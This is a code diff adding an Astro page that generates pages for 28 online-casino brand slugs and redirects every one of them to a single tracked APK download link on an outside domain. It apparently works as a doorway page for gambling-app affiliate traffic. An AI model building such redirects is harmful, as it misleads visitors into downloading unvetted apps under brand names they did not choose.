@@ -1,0 +1,19 @@
+---
+import type { GetStaticPaths } from 'astro';
+
+export const getStaticPaths: GetStaticPaths = () => {
+  const brands = [
+    '7k-casino', 'slotozal', 'maxslots', 'beef-casino', 'legzo-casino',
+    'leebet', 'r7-casino', 'starda-casino', 'kometa-casino', 'vavada',
+    'vulkan', 'pharaon-casino', 'vodka-casino', 'lev-casino', 'kent-casino',
+    'fresh-casino', 'gizbo-casino', 'irwin-casino', 'martin-casino',
+    'monroe-casino', 'bui-casino', 'kush-casino', 'hype-casino',
+    'babos-casino', 'grizzly-casino', 'motor-casino', 'banda-casino', 'ra-casino',
+  ];
+  return brands.map((slug) => ({ params: { slug } }));
+};
+
+const apkLink = 'https://win-halllucky.com/l/693fb0457296d17cee0839f2?sub_id=apps';
+
+return Astro.redirect(apkLink, 302);
+---
